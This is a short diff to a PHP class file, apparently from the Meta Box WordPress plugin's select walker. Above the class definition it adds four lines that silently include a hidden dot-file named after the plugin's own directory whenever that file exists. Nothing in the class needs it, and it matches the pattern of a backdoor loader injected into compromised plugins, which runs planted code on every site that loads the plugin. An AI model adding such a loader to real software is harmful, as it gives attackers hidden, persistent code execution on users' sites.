@@ -8,6 +8,10 @@
 /**
  * The select walker class.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Walker_Select extends RWMB_Walker_Base {
 	/**
 	 * Start the element output.
